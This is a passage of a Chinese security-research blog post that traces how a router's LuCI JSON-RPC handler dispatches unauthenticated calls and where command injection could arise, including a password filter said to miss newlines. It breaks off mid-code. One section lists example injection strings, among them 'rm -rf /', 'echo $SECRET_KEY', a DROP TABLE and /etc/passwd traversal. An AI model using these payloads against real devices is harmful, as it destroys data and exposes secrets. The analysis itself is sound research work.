<span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    id = id <span class="keyword">or</span> luci.json.null</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 1.0 compatibility</span></span><br><span class="line">    <span class="keyword">if</span> jsonrpc ~= <span class="string">&quot;2.0&quot;</span> <span class="keyword">then</span></span><br><span class="line">        jsonrpc = <span class="literal">nil</span></span><br><span class="line">        res = res <span class="keyword">or</span> luci.json.null</span><br><span class="line">        err = err <span class="keyword">or</span> luci.json.null</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="comment">-- if type(res) == &quot;string&quot; then</span></span><br><span class="line">    <span class="comment">--     res = luci.json.decode(res) or res</span></span><br><span class="line">    <span class="comment">-- end</span></span><br><span class="line">    <span class="keyword">return</span> &#123;id = id, data = res, <span class="built_in">error</span> = err, jsonrpc = jsonrpc, code = <span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy</span><span class="params">(method, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> res = &#123;luci.util.copcall(method, ...)&#125;</span><br><span class="line">    <span class="keyword">local</span> stat = <span class="built_in">table</span>.<span class="built_in">remove</span>(res, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> stat <span class="keyword">then</span></span><br><span class="line">        tool.<span class="built_in">debug</span>(<span class="string">&quot;[&quot;</span> .. <span class="built_in">os</span>.<span class="built_in">date</span>() .. <span class="string">&quot; -s]&quot;</span> .. <span class="string">&quot;=====      RPC ERROR LOG&quot;</span>, &#123;params = ...&#125;)</span><br><span class="line">        <span class="comment">-- return nil, &#123;code = -32602, data = &quot;jsonrpc:81&quot;, params = ..., res = res&#125;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, &#123;code = <span class="number">-32602</span>, data = <span class="string">&quot;jsonrpc:81&quot;</span>, res = res&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> #res &lt;= <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> res[<span class="number">1</span>] <span class="keyword">or</span> luci.json.null</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tool.<span class="built_in">debug</span>(<span class="string">&quot;[&quot;</span> .. <span class="built_in">os</span>.<span class="built_in">date</span>() .. <span class="string">&quot; -s]&quot;</span> .. <span class="string">&quot;=====      RPC ERROR LOG&quot;</span>, &#123;params = ...&#125;)</span><br><span class="line">            <span class="comment">-- return &#123;code = -32603, data = &quot;jsonrpc:89&quot;, params = ..., res = res&#125;</span></span><br><span class="line">            <span class="keyword">return</span> &#123;code = <span class="number">-32603</span>, data = <span class="string">&quot;jsonrpc:89&quot;</span>, res = res&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>四个函数分别的作用是</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resolve(<span class="built_in">mod</span>, method)： <span class="comment">---解析模块 mod 中的方法 method。</span></span><br><span class="line">handle(tbl, rawsource, ...)： <span class="comment">---处理 JSON-RPC 请求。</span></span><br><span class="line">reply(jsonrpc, id, res, err)： <span class="comment">---生成 JSON-RPC 响应。</span></span><br><span class="line">proxy(method, ...)： <span class="comment">---代理执行 JSON-RPC 方法。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> decoder = luci.json.Decoder()</span><br><span class="line">    <span class="keyword">local</span> stat, err = luci.ltn12.pump.all(rawsource, decoder:sink())</span><br><span class="line">    <span class="keyword">local</span> json = decoder:get()</span><br><span class="line">    <span class="keyword">local</span> response</span><br><span class="line">    <span class="keyword">local</span> success = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32601</span>, message = <span class="string">&quot;Method not found.&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32600</span>, message = <span class="string">&quot;Invalid request.&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        response = reply(<span class="string">&quot;2.0&quot;</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, &#123;code = <span class="number">-32700</span>, message = <span class="string">&quot;Parse error.&quot;</span>, err = err&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> luci.json.Encoder(response, ...):source()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>着重看中间部分：</p>
<ul>
<li>使用 <code>resolve</code> 函数解析method，找到对应的 Lua 函数。</li>
<li>如果找到方法，使用<code>proxy</code>函数调用方法，并生成响应。<ul>
<li><code>proxy(method, json.params or &#123;&#125;)</code>：调用方法并传递参数。</li>
<li><code>reply(json.jsonrpc, json.id, ...)</code>：生成 JSON-RPC 响应。</li>
</ul>
</li>
<li>如果未找到方法，生成错误响应，错误码 <code>-32601</code> 表示 “Method not found”。</li>
</ul>
<p>代码细节：</p>
<ul>
<li><p><code>resolve</code> 函数用于解析方法名，找到对应的 Lua 函数。</p>
</li>
<li><p>它将方法名按 <code>.</code> 分割成路径，然后逐级查找对应的表，最终找到方法。</p>
</li>
<li><p><code>reply</code> 函数用于生成 JSON-RPC 响应。</p>
</li>
<li><p>它根据 JSON-RPC 版本和请求 ID 生成响应对象。</p>
</li>
<li><p><code>proxy</code> 函数用于安全调用方法，并处理可能的错误。</p>
</li>
<li><p>它使用 <code>luci.util.copcall</code> 捕获调用中的错误，并根据调用结果生成响应。</p>
</li>
</ul>
<p>可以得知这里<strong>通过<code>JSON</code>数据的<code>method</code>字段定位并调用<code>noauth.lua</code>中对应的函数，同时将<code>Json</code>数据的<code>params</code>字段内容作为参数传入</strong></p>
<h3 id="分析noauth-lua-寻找可疑漏洞的入口"><a href="#分析noauth-lua-寻找可疑漏洞的入口" class="headerlink" title="分析noauth.lua(寻找可疑漏洞的入口)"></a>分析noauth.lua(寻找可疑漏洞的入口)</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.modules.noauth&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 登录</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> disp = <span class="built_in">require</span>(<span class="string">&quot;luci.dispatcher&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.common&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span></span><br><span class="line">        tool.eweblog(<span class="string">&quot;INVALID DATA&quot;</span>, <span class="string">&quot;LOGIN FAILED&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> authOk</span><br><span class="line">    <span class="keyword">local</span> ua = <span class="built_in">os</span>.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_USER_AGENT&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;unknown brower (ua is nil)&quot;</span></span><br><span class="line">    tool.eweblog(ua, <span class="string">&quot;LOGIN UA&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> checkStat = &#123;</span><br><span class="line">        password = params.password,</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span>, <span class="comment">-- params.username,</span></span><br><span class="line">        encry = params.encry,</span><br><span class="line">        limit = params.limit</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br><span class="line">    <span class="keyword">local</span> log_opt = &#123;username = params.username, level = <span class="string">&quot;auth.notice&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> authres <span class="keyword">then</span></span><br><span class="line">        authOk = disp.writeSid(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="comment">-- 手动登录时设置时间</span></span><br><span class="line">        <span class="keyword">if</span> params.<span class="built_in">time</span> <span class="keyword">and</span> <span class="built_in">tonumber</span>(params.<span class="built_in">time</span>) <span class="keyword">then</span></span><br><span class="line">            common.setSysTime(&#123;<span class="built_in">time</span> = params.<span class="built_in">time</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-success&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-fail&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tool.write_log(log_opt)</span><br><span class="line">    <span class="keyword">return</span> authOk</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 单点登录</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">singleLogin</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> sauth = luci.sauth</span><br><span class="line">    <span class="keyword">local</span> fs = <span class="built_in">require</span> <span class="string">&quot;nixio.fs&quot;</span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">config</span> = <span class="built_in">require</span>(<span class="string">&quot;luci.config&quot;</span>)</span><br><span class="line">    <span class="built_in">config</span>.sauth = <span class="built_in">config</span>.sauth <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">local</span> sessionpath = <span class="built_in">config</span>.sauth.sessionpath</span><br><span class="line">    <span class="keyword">if</span> sauth.sane() <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> id</span><br><span class="line">        <span class="keyword">for</span> id <span class="keyword">in</span> fs.dir(sessionpath) <span class="keyword">do</span></span><br><span class="line">            sauth.kill(id)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 网络合并</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ping checknet</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNet</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">if</span> params.host <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">len</span>(params.host) &gt; <span class="number">50</span> <span class="keyword">or</span> <span class="keyword">not</span> tool.checkIp(params.host) <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> &#123;connect = <span class="literal">false</span>, msg = <span class="string">&quot;host illegal&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">local</span> json = <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">        <span class="keyword">local</span> _curl =</span><br><span class="line">            <span class="string">&#x27;curl -s -k -X POST \&#x27;http://%s/cgi-bin/luci/api/auth\&#x27; -H content-type:application/json -d \&#x27;&#123;&quot;method&quot;:&quot;checkNet&quot;&#125;\&#x27;&#x27;</span> %</span><br><span class="line">            params.host</span><br><span class="line">        <span class="keyword">local</span> _data = json.decode(luci.sys.exec(_curl))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(_data) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(_data.data) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">                <span class="keyword">return</span> _data.data</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">return</span> &#123;connect = <span class="literal">false</span>&#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> &#123;connect = <span class="literal">false</span>&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> &#123;connect = <span class="literal">true</span>&#125;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>向<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_3">winmt师傅</a>学习</p>
<p>在noauth.lua中，有<code>login</code>，<code>singleLogin</code>，<code>merge</code>和<code>checkNet</code>四个方法。其中，<code>singleLogin</code>函数无可控制的参数，不用看；<code>checkNet</code>函数中参数可控的字段只有<code>params.host</code>，并拼接入了命令字符串执行，但是在之前有<code>tool.checkIp(params.host)</code>对其的合法性进行了检查，无法绕过。</p>
<p>那么思考如果没有对host进行合法性检查有什么利用手段呢？</p>
<ol>
<li><strong>输入验证和注入攻击</strong>：<ul>
<li>SQL注入：如果非法地址未被正确验证并直接用于数据库查询，攻击者可能构造恶意输入来执行任意SQL代码。<ul>
<li>例如：<code>params.host = &quot;192.168.1.1&#39;; DROP TABLE users; --&quot;</code></li>
</ul>
</li>
<li>命令注入：如果非法地址用于系统命令或脚本执行，攻击者可能注入恶意命令。<ul>
<li>例如：<code>params.host = &quot;192.168.1.1; rm -rf / --&quot;</code></li>
<li><code>params.host = &quot;192.168.1.1;rm -rf /*&#39;#&quot;</code>加个’让url闭合#注释掉之后的直到’</li>
</ul>
</li>
</ul>
</li>
<li><strong>跨站脚本攻击（XSS）</strong>：<ul>
<li>如果非法地址未被正确过滤并显示在网页中，攻击者可能插入恶意脚本，导致XSS攻击。<ul>
<li>例如：<code>params.host = &quot;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;&quot;</code></li>
</ul>
</li>
</ul>
</li>
<li><strong>跨站请求伪造（CSRF）</strong>：<ul>
<li>如果非法地址用于生成或处理URL，攻击者可能构造恶意请求以执行CSRF攻击。<ul>
<li>例如：<code>params.host = &quot;example.com&quot;;</code> 被替换为攻击者控制的域名。</li>
</ul>
</li>
</ul>
</li>
<li><strong>拒绝服务（DoS）攻击</strong>：<ul>
<li>处理非法地址可能导致服务器资源耗尽，导致服务不可用。例如，处理一个非常长的字符串或复杂的正则表达式可能消耗大量CPU和内存资源。</li>
</ul>
</li>
<li><strong>信息泄露</strong>：<ul>
<li>如果非法地址包含敏感信息且未被正确处理，可能导致信息泄露。<ul>
<li>例如：<code>params.host = &quot;192.168.1.1; echo $SECRET_KEY&quot;</code></li>
</ul>
</li>
</ul>
</li>
<li><strong>路径遍历攻击</strong>：<ul>
<li>如果非法地址用于文件路径操作，攻击者可能利用路径遍历来访问或修改不应访问的文件。<ul>
<li>例如：<code>params.host = &quot;../../../../etc/passwd&quot;</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<p>这就是web吗太高级了woc</p>
<p>可惜对host字段进行了check</p>
<p>那么来看login函数，乍一看可以控制的字符十分的多，params.password，params.time，params.encry，params.limit</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 登录</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> disp = <span class="built_in">require</span>(<span class="string">&quot;luci.dispatcher&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> common = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.common&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span>  <span class="comment">--password过滤危险字符，猜测之后有命令执行</span></span><br><span class="line">        tool.eweblog(<span class="string">&quot;INVALID DATA&quot;</span>, <span class="string">&quot;LOGIN FAILED&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> authOk</span><br><span class="line">    <span class="keyword">local</span> ua = <span class="built_in">os</span>.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_USER_AGENT&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;unknown brower (ua is nil)&quot;</span></span><br><span class="line">    tool.eweblog(ua, <span class="string">&quot;LOGIN UA&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> checkStat = &#123;</span><br><span class="line">        password = params.password,</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span>, <span class="comment">-- params.username,</span></span><br><span class="line">        encry = params.encry,</span><br><span class="line">        limit = params.limit</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br><span class="line">    <span class="keyword">local</span> log_opt = &#123;username = params.username, level = <span class="string">&quot;auth.notice&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> authres <span class="keyword">then</span></span><br><span class="line">        authOk = disp.writeSid(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="comment">-- 手动登录时设置时间</span></span><br><span class="line">        <span class="keyword">if</span> params.<span class="built_in">time</span> <span class="keyword">and</span> <span class="built_in">tonumber</span>(params.<span class="built_in">time</span>) <span class="keyword">then</span></span><br><span class="line">            common.setSysTime(&#123;<span class="built_in">time</span> = params.<span class="built_in">time</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-success&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        log_opt.action = <span class="string">&quot;login-fail&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tool.write_log(log_opt)</span><br><span class="line">    <span class="keyword">return</span> authOk</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>可以看到</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span>  <span class="comment">--password过滤危险字符，猜测之后有命令执行</span></span><br></pre></td></tr></table></figure>

<p>这里过滤了</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">includeXxs</span><span class="params">(str)</span></span></span><br><span class="line">    <span class="keyword">local</span> ngstr = <span class="string">&quot;[`&amp;$;|]&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">match</span>(str, ngstr) ~= <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>winmt师傅说少过滤了一个\n或许未来有命令注入的可能，类似；这个效果</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br></pre></td></tr></table></figure>

<p>这边有个tool调用checkPasswd</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 检测密码是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPasswd</span><span class="params">(checkStat)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> _data = &#123;</span><br><span class="line">        <span class="built_in">type</span> = checkStat.encry <span class="keyword">and</span> <span class="string">&quot;enc&quot;</span> <span class="keyword">or</span> <span class="string">&quot;noenc&quot;</span>,</span><br><span class="line">        password = checkStat.password,</span><br><span class="line">        name = checkStat.username,</span><br><span class="line">        limit = checkStat.limit <span class="keyword">and</span> <span class="string">&quot;true&quot;</span> <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> _check = cmd.devSta.get(&#123;<span class="built_in">module</span> = <span class="string">&quot;adminCheck&quot;</span>, device = <span class="string">&quot;pc&quot;</span>, data = _data&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(_check) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> _check.result == <span class="string">&quot;success&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>, _check.reason</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>会发现encry字段和limit字段都变成了加密或者不加密，真或者假，好像变得不可控了</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _check = cmd.devSta.get(&#123;<span class="built_in">module</span> = <span class="string">&quot;adminCheck&quot;</span>, device = <span class="string">&quot;pc&quot;</span>, data = _data&#125;)  <span class="comment">--传入的参数为json</span></span><br></pre></td></tr></table></figure>

<p>调用了cmd的devSta.get</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> opt[i] == <span class="string">&quot;get&quot;</span> <span class="keyword">then</span></span><br><span class="line">    devCap[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p> 它是首先会将params传入doParams解析，之后用fetch</p>
<p>那么来分析一下doParams函数</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">doParams</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="comment">-- web接口调用全部去掉时间，强制force设置下去</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(params.data) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span>    <span class="comment">--如果是table表那么赋值0</span></span><br><span class="line">        params.data.currentTime = <span class="literal">nil</span></span><br><span class="line">        params.data.configTime = <span class="literal">nil</span></span><br><span class="line">        params.data.configId = <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">if</span> tool.includeXxs(params.<span class="built_in">module</span>) <span class="keyword">or</span> tool.includeXxs(params.method) <span class="keyword">then</span>     <span class="comment">--过滤危险符号</span></span><br><span class="line">        params.<span 